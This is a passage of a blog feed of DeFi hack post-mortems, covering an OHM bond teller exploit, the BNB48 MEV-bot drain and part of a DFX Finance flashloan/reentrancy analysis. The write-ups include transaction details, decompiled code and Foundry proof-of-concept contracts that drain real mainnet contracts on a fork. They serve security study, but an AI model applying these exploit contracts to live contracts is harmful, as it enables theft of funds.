class="line"></span><br><span class="line">    IOHM public ohm = IOHM(address(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5));</span><br><span class="line">    IBondFixedExpiryTeller public BondFixedExpiryTeller = IBondFixedExpiryTeller(address(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156));</span><br><span class="line"></span><br><span class="line">     function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;mainnet&quot;, 15_794_363);</span><br><span class="line"></span><br><span class="line">        vm.label(address(ohm), &quot;OHM&quot;);</span><br><span class="line">        vm.label(address(BondFixedExpiryTeller), &quot;BondFixedExpiryTeller&quot;);</span><br><span class="line">        vm.label(address(this), &quot;attackerContract&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_Exploit() public &#123;</span><br><span class="line">        console.log(&quot;[before] address(this) OHM balance&quot;,ohm.balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">        uint256 amountToHack = ohm.balanceOf(address(BondFixedExpiryTeller));</span><br><span class="line">        BondFixedExpiryTeller.redeem(address(this), amountToHack);</span><br><span class="line"></span><br><span class="line">        console.log(&quot;[after] address(this) OHM balance&quot;,ohm.balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">        assertEq(amountToHack, ohm.balanceOf(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function expiry() public returns(uint256)&#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function burn(address,uint256) public returns(bool)&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function underlying() public returns(address)&#123;</span><br><span class="line">        return address(ohm);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>如果参数是外部可控的，一定要进行检验</p>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.BNB48@MEVBot</title>
      <link href="/2023/09/18/08.PoC/04.BNB48@MEVBot/"/>
      <url>/2023/09/18/08.PoC/04.BNB48@MEVBot/</url>
      
        <content type="html"><![CDATA[<h1 id="BNB48-MEVBot"><a href="#BNB48-MEVBot" class="headerlink" title="BNB48@MEVBot"></a>BNB48@MEVBot</h1><h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>有一个MEV机器人遭到了黑客攻击，损失了六种资产</p><ul><li>时间：2022.09.13</li><li>损失金额：$140K</li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>交易hash：<a href="https://bscscan.com/tx/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2">0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2</a></li><li><p>MEVBot（未开源）：<a href="https://bscscan.com/address/0x64dd59d6c7f09dc05b472ce5cb961b6e10106e1d#code">0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d</a></p></li><li><p>攻击合约：<a href="https://bscscan.com/address/0x5cb11ce550a2e6c24ebfc8df86c5757b596e69c1">0x5cb11ce550a2e6c24ebfc8df86c5757b596e69c1</a></p></li><li>发起攻击的EOA地址：<a href="https://bscscan.com/address/0xee286554f8b315f0560a15b6f085ddad616d0601">0xee286554f8b315f0560a15b6f085ddad616d0601</a></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><img src="/2023/09/18/08.PoC/04.BNB48@MEVBot/image-20230826125705769.png" alt="image-20230826125705769"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p><img src="/2023/09/18/08.PoC/04.BNB48@MEVBot/image-20230826125923254.png" alt="image-20230826125923254"></p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>从<a href="https://explorer.phalcon.xyz/tx/bsc/0xd48758ef48d113b78a09f7b8c7cd663ad79e9965852e872fdfc92234c3e598d2">攻击过程</a>可以知道，此次攻击手法都是一样的，我们分析其中一个就好，黑客都是调用了MEV机器人的<code>pancakeCall()</code>。</p><p><img src="/2023/09/18/08.PoC/04.BNB48@MEVBot/image-20230826131002577.png" alt="image-20230826131002577"></p><p>知道了攻击过程，那么我们就要看看，为什么黑客可以越过权限，直接获取资产。MEV机器人合约没有开源，我们进行<a href="https://library.dedaub.com/decompile?md5=58c948aa3e23b09bc625f06f37f93c7f">反编译</a>。<code>pancakeCall()</code>是闪电贷的回调函数，设置为public是没问题的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function pancakeCall(address varg0, uint256 varg1, uint256 varg2, bytes varg3) public nonPayable &#123; </span><br><span class="line">    require(msg.data.length - 4 &gt;= 128);</span><br><span class="line">    require(varg0 == varg0);</span><br><span class="line">    require(varg3 &lt;= 0xffffffffffffffff);</span><br><span class="line">    require(4 + varg3 + 31 &lt; msg.data.length);</span><br><span class="line">    require(varg3.length &lt;= 0xffffffffffffffff);</span><br><span class="line">    require(4 + varg3 + varg3.length + 32 &lt;= msg.data.length);</span><br><span class="line">    v0 = new bytes[](varg3.length);</span><br><span class="line">    CALLDATACOPY(v0.data, varg3.data, varg3.length);</span><br><span class="line">    v0[varg3.length] = 0;</span><br><span class="line">    0x10a(v0, varg2, varg1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后他会调用<code>0x10a()</code>，分析一下这个方法：</p><p><img src="/2023/09/18/08.PoC/04.BNB48@MEVBot/image-20230826132534864.png" alt="image-20230826132534864"></p><p>因此，设置好calldata即可攻击，我们来看一下第一个攻击的varg3内容：我们可以发现<code>ee286554f8b315f0560a15b6f085ddad616d0601</code>就是发起黑客EOA的地址，后面的一堆0是为了满足<code>pancakeCall()</code>中对长度的限制<code>require(msg.data.length - 4 &gt;= 128)</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">000000000000000000000000ee286554f8b315f0560a15b6f085ddad616d0601</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC/tree/master/test">github</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker is Test &#123;</span><br><span class="line"></span><br><span class="line">    IMEVBOT public mevbot = IMEVBOT(address(0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d));</span><br><span class="line"></span><br><span class="line">    IBSCUSD public BSCUSD = IBSCUSD(address(0x55d398326f99059fF775485246999027B3197955));</span><br><span class="line">    IWBNB public WBNB = IWBNB(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));</span><br><span class="line">    IBUSD public BUSD = IBUSD(address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56));</span><br><span class="line">    IUSDC public USDC = IUSDC(address(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d));</span><br><span class="line">    IBTCB public BTCB = IBTCB(address(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c));</span><br><span class="line">    IETH public ETH = IETH(address(0x2170Ed0880ac9A755fd29B2688956BD959F933F8));</span><br><span class="line"></span><br><span class="line">    address public token0;</span><br><span class="line">    address public token1;</span><br><span class="line"></span><br><span class="line">     function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 21_297_409);</span><br><span class="line"></span><br><span class="line">        vm.label(address(mevbot), &quot;mevbot&quot;);</span><br><span class="line">        vm.label(address(BSCUSD), &quot;BSCUSD&quot;);</span><br><span class="line">        vm.label(address(WBNB), &quot;WBNB&quot;);</span><br><span class="line">        vm.label(address(BUSD), &quot;BUSD&quot;);</span><br><span class="line">        vm.label(address(USDC), &quot;USDC&quot;);</span><br><span class="line">        vm.label(address(BTCB), &quot;BTCB&quot;);</span><br><span class="line">        vm.label(address(ETH), &quot;ETH&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_Exploit() public &#123;</span><br><span class="line">        emit log_named_decimal_uint(&quot;[Start] Attacker BSCUSD balance before exploit&quot;, BSCUSD.balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[Start] Attacker WBNB balance before exploit&quot;, WBNB.balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[Start] Attacker BUSD balance before exploit&quot;, BUSD.balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[Start] Attacker USDC balance before exploit&quot;, USDC.balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[Start] Attacker BTCB balance before exploit&quot;, BTCB.balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[Start] Attacker ETH balance before exploit&quot;, ETH.balanceOf(address(this)), 18);</span><br><span class="line"></span><br><span class="line">        // 下面分别进行6次攻击</span><br><span class="line"></span><br><span class="line">        // 01</span><br><span class="line">        (token0, token1) = (address(BSCUSD), address(BSCUSD));</span><br><span class="line">        // 拿完所有钱</span><br><span class="line">        uint256 BSCUSD_balance = BSCUSD.balanceOf(address(mevbot));</span><br><span class="line">        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496</span><br><span class="line">        // 构造varg3</span><br><span class="line">        bytes memory data01 = abi.encodePacked(</span><br><span class="line">            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)</span><br><span class="line">        );</span><br><span class="line">        mevbot.pancakeCall(address(this), BSCUSD_balance, 0, data01);</span><br><span class="line"></span><br><span class="line">        // 02</span><br><span class="line">        (token0, token1) = (address(WBNB), address(WBNB));</span><br><span class="line">        uint256 WBNB_balance = WBNB.balanceOf(address(mevbot));</span><br><span class="line">        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496</span><br><span class="line">        bytes memory data02 = abi.encodePacked(</span><br><span class="line">            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)</span><br><span class="line">        );</span><br><span class="line">        mevbot.pancakeCall(address(this), WBNB_balance, 0, data02);</span><br><span class="line"></span><br><span class="line">        // 03</span><br><span class="line">        (token0, token1) = (address(BUSD), address(BUSD));</span><br><span class="line">        uint256 BUSD_balance = BUSD.balanceOf(address(mevbot));</span><br><span class="line">        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496</span><br><span class="line">        bytes memory data03 = abi.encodePacked(</span><br><span class="line">            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)</span><br><span class="line">        );</span><br><span class="line">        mevbot.pancakeCall(address(this), BUSD_balance, 0, data03);</span><br><span class="line"></span><br><span class="line">        // 04</span><br><span class="line">        (token0, token1) = (address(USDC), address(USDC));</span><br><span class="line">        uint256 USDC_balance = USDC.balanceOf(address(mevbot));</span><br><span class="line">        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496</span><br><span class="line">        bytes memory data04 = abi.encodePacked(</span><br><span class="line">            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)</span><br><span class="line">        );</span><br><span class="line">        mevbot.pancakeCall(address(this), USDC_balance, 0, data04);</span><br><span class="line"></span><br><span class="line">        // 05</span><br><span class="line">        (token0, token1) = (address(BTCB), address(BTCB));</span><br><span class="line">        uint256 BTCB_balance = BTCB.balanceOf(address(mevbot));</span><br><span class="line">        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496</span><br><span class="line">        bytes memory data05 = abi.encodePacked(</span><br><span class="line">            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)</span><br><span class="line">        );</span><br><span class="line">        mevbot.pancakeCall(address(this), BTCB_balance, 0, data05);</span><br><span class="line"></span><br><span class="line">        // 06</span><br><span class="line">        (token0, token1) = (address(ETH), address(ETH));</span><br><span class="line">        uint256 ETH_balance = ETH.balanceOf(address(mevbot));</span><br><span class="line">        // address(this) = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496</span><br><span class="line">        bytes memory data06 = abi.encodePacked(</span><br><span class="line">            bytes32(0x0000000000000000000000007FA9385bE102ac3EAc297483Dd6233D62b3e1496),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000),</span><br><span class="line">            bytes32(0x0000000000000000000000000000000000000000000000000000000000000000)</span><br><span class="line">        );</span><br><span class="line">        mevbot.pancakeCall(address(this), ETH_balance, 0, data06);</span><br><span class="line"></span><br><span class="line">        console.log();</span><br><span class="line">        emit log_named_decimal_uint(&quot;[After] Attacker BSCUSD balance before exploit&quot;, BSCUSD.balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[After] Attacker WBNB balance before exploit&quot;, WBNB.balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[After] Attacker BUSD balance before exploit&quot;, BUSD.balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[After] Attacker USDC balance before exploit&quot;, USDC.balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[After] Attacker BTCB balance before exploit&quot;, BTCB.balanceOf(address(this)), 18);</span><br><span class="line">        emit log_named_decimal_uint(&quot;[After] Attacker ETH balance before exploit&quot;, ETH.balanceOf(address(this)), 18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(uint256 amount0, uint256 amount1, address to, bytes calldata data) public &#123;</span><br><span class="line">        // 没啥用，只是因为MEV机器人合约需要回调 调用者 的swap方法，因此需要补一下这个方法</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>无论是否验证合约，在关键的方法中，一定要做权限验证，不要认为合约没有验证就是安全的。本次攻击是产生在于MEV机器人认为自己的合约没有验证，以为很安全，没有人会调用它的方法，因此没有设置权限验证，结果被黑客发现了，然后获利。</p>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.DFX Finance @Reentrancy@flashloan</title>
      <link href="/2023/09/18/08.PoC/03.DFX%20Finance%20@Reentrancy@flashloan/"/>
      <url>/2023/09/18/08.PoC/03.DFX%20Finance%20@Reentrancy@flashloan/</url>
      
        <content type="html"><![CDATA[<h1 id="DFX-Finance-Reentrancy-flashloan"><a href="#DFX-Finance-Reentrancy-flashloan" class="headerlink" title="DFX Finance @Reentrancy@flashloan"></a>DFX Finance @Reentrancy@flashloan</h1><p><strong>KEY WORDS:</strong> flashloan, reentrancy</p><p><strong>ATTACK TIME:</strong> 2022.11.11</p><p><strong>LOSSES：</strong>4 million$</p><h2 id="Event-Background"><a href="#Event-Background" class="headerlink" title="Event Background"></a>Event Background</h2><p>DFX is an Ethereum-based decentralized exchange protocol with a dynamically tuned bonding curve optimized for fiat-backed stablecoins (like USDC, CADC, EURS, XSGD, etc) using real-world FX price feeds.</p><h2 id="Tx-Details"><a href="#Tx-Details" class="headerlink" title="Tx Details"></a>Tx Details</h2><ul><li><p><a href="https://etherscan.io/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7">one of attack txs</a></p><ul><li><p>hacker contract: 0x6cfa86a352339e766ff1ca119c8c40824f41f22d</p></li><li><p>dfx-xidr-v2 contract: 0x46161158b1947d9149e066d6d31af1283b2d377c</p></li></ul></li><li><p><a href="https://explorer.phalcon.xyz/tx/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7">fund change</a></p></li><li>0x27e843260c71443b4cc8cb6bf226c3f77b9695af: it is a multi wallet that receives fee with the <code>flashloan()</code>.</li></ul><p><img src="https://moe.photo/images/2023/07/15/image-20230715204009696.png" alt></p><ul><li><a href="https://metasleuth.io/result/eth/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7">fund flow</a><ul><li>[1] [2]: hacker borrowed a lot of USDC and XIDR from dfx</li><li>[3] [4]: hacker paid back USDC and XIDR to dfx</li><li>[5] : <code>token dfx-xidr-v2</code> was minted to hacker</li><li>[6] [7] : DFX multi wallet receives some USDC and XIDR as fee of <code>flashloan()</code></li><li>[8] : hacker burned <code>token dfx-xidr-v2</code></li></ul></li></ul><p><img src="https://moe.photo/images/2023/07/15/image-20230715233935474.png" alt></p><h2 id="Attack-Process"><a href="#Attack-Process" class="headerlink" title="Attack Process"></a>Attack Process</h2><h3 id="The-entire-attack-process"><a href="#The-entire-attack-process" class="headerlink" title="The entire attack process"></a>The entire attack process</h3><p><img src="https://moe.photo/images/2023/07/15/image-20230715213612801.png" alt></p><h3 id="1-preparation"><a href="#1-preparation" class="headerlink" title="1.preparation"></a>1.preparation</h3><p>why hacker called viewDeposit()?</p><p>Hacker wanted to know how much token pair  he should deposit to get <code>200,000*1e18</code> <code>token dfx-xidr-v2</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/// @notice view deposits and curves minted a given deposit would return</span><br><span class="line">    /// @param _deposit the full amount of stablecoins you want to deposit. Divided evenly according to the</span><br><span class="line">    ///                 prevailing proportions of the numeraire assets of the pool</span><br><span class="line">    /// @return (the amount of curves you receive in return for your deposit,</span><br><span class="line">    ///          the amount deposited for each numeraire)</span><br><span class="line">    function viewDeposit(uint256 _deposit) external view transactable returns (uint256, uint256[] memory) &#123;</span><br><span class="line">        // curvesToMint_, depositsToMake_</span><br><span class="line">        return ProportionalLiquidity.viewProportionalDeposit(curve, _deposit);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="2-flashloan"><a href="#2-flashloan" class="headerlink" title="2.flashloan"></a>2.flashloan</h3><p><img src="https://moe.photo/images/2023/07/15/image-20230715211603181.png" alt></p><p>in flash() we know it is similar to uniswapV2’s <code>flashloan()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">function flash(</span><br><span class="line">       address recipient,</span><br><span class="line">       uint256 amount0,</span><br><span class="line">       uint256 amount1,</span><br><span class="line">       bytes calldata data</span><br><span class="line">   ) external transactable noDelegateCall isNotEmergency &#123;</span><br><span class="line">       uint256 fee = curve.epsilon.mulu(1e18);</span><br><span class="line">       </span><br><span class="line">       require(IERC20(derivatives[0]).balanceOf(address(this)) &gt; 0, &#x27;Curve/token0-zero-liquidity-depth&#x27;);</span><br><span class="line">       require(IERC20(derivatives[1]).balanceOf(address(this)) &gt; 0, &#x27;Curve/token1-zero-liquidity-depth&#x27;);</span><br><span class="line">       </span><br><span class="line">       // calculate the fee and money</span><br><span class="line">       uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e18);</span><br><span class="line">       uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e18);</span><br><span class="line">       uint256 balance0Before = IERC20(derivatives[0]).balanceOf(address(this));</span><br><span class="line">       uint256 balance1Before = IERC20(derivatives[1]).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">// lend money</span><br><span class="line">       if (amount0 &gt; 0) IERC20(derivatives[0]).safeTransfer(recipient, amount0);</span><br><span class="line">       if (amount1 &gt; 0) IERC20(derivatives[1]).safeTransfer(recipient, amount1);</span><br><span class="line"></span><br><span class="line">// fallabck</span><br><span class="line">       IFlashCallback(msg.sender).flashCallback(fee0, fee1, data);</span><br><span class="line"></span><br><span class="line">       uint256 balance0After = IERC20(derivatives[0]).balanceOf(address(this));</span><br><span class="line">       uint256 balance1After = IERC20(derivatives[1]).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">// check the balance</span><br><span class="line">       require(balance0Before.add(fee0) &lt;= balance0After, &#x27;Curve/insufficient-token0-returned&#x27;);</span><br><span class="line">       require(balance1Before.add(fee1) &lt;= balance1After, &#x27;Curve/insufficient-token1-returned&#x27;);</span><br><span class="line"></span><br><span class="line">       // sub is safe because we know balanceAfter is gt balanceBefore by at least fee</span><br><span class="line">       uint256 paid0 = balance0After - balance0Before;</span><br><span class="line">       uint256 paid1 = balance1After - balance1Before;</span><br><span class="line"></span><br><span class="line">       IERC20(derivatives[0]).safeTransfer(owner, paid0);        </span><br><span class="line">       IERC20(derivatives[1]).safeTransfer(owner, paid1);        </span><br><span class="line"></span><br><span class="line">       emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);</span><br><span class="line">   &#125;    </span><br></pre></td></tr></table></figure><h3 id="3-pay-back-for-flashloan"><a href="#3-pay-back-for-flashloan" class="headerlink" title="3.pay back for flashloan"></a>3.pay back for flashloan</h3><p><img src="https://moe.photo/images/2023/07/15/image-20230715213717257.png" alt></p><h3 id="4-flashCallBack"><a href="#4-flashCallBack" class="headerlink" title="4.flashCallBack"></a>4.flashCallBack</h3><p><img src="https://moe.photo/images/2023/07/15/image-20230715212158778.png" alt></p><p>deposit():</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/// @notice deposit into the pool with no slippage from the numeraire assets the pool supports</span><br><span class="line">    /// @param  _deposit the full amount you want to deposit into the pool which will be divided up evenly amongst</span><br><span class="line">    ///                  the numeraire assets of the pool</span><br><span class="line">    /// @return (the amount of curves you receive in return for your deposit,</span><br><span class="line">    ///          the amount deposited for each numeraire)</span><br><span class="line">    function deposit(uint256 _deposit, uint256 _deadline)</span><br><span class="line">        external</span><br><span class="line">        deadline(_deadline)</span><br><span class="line">        transactable</span><br><span class="line">        nonReentrant</span><br><span class="line">        noDelegateCall</span><br><span class="line">        notInWhitelistingStage</span><br><span class="line">        isNotEmergency</span><br><span class="line">        returns (uint256, uint256[] memory)</span><br><span class="line">    &#123;</span><br><span class="line">        // (curvesMinted_,  deposits_)</span><br><span class="line">        return ProportionalLiquidity.proportionalDeposit(curve, _deposit);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Hacker deposited USDC and XIDR that he got in flashloan to mint <code>token dfx-xidr-usdc</code>. Attention, hacker did deposit meaned that contract dfx-xidr-usdc would receive this USDC and XIDR, resulting at pass these checking:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require(balance0Before.add(fee0) &lt;= balance0After, &#x27;Curve/insufficient-token0-returned&#x27;);</span><br><span class="line">require(balance1Before.add(fee1) &lt;= balance1After, &#x27;Curve/insufficient-token1-returned&#x27;);</span><br></pre></td></tr></table></figure><h3 id="5-withdraw-amp-exploit"><a href="#5-withdraw-amp-exploit" class="headerlink" title="5.withdraw&amp;exploit"></a>5.withdraw&amp;exploit</h3><p><img src="https://moe.photo/images/2023/07/15/image-20230715213819792.png" alt></p><h2 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h2><p>attack logic is the same as <a href="https://www.levi104.com/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/04.Side%20Entrance/">Damn Vulnerable DeFi CTF’s Side Entrance</a>.</p><h2 id="Attack-Recurrence"><a href="#Attack-Recurrence" class="headerlink" title="Attack Recurrence"></a>Attack Recurrence</h2><p><a href="https://github.com/chen4903/BlockChainPoC/blob/master/test/01.DFX.sol">GitHub</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 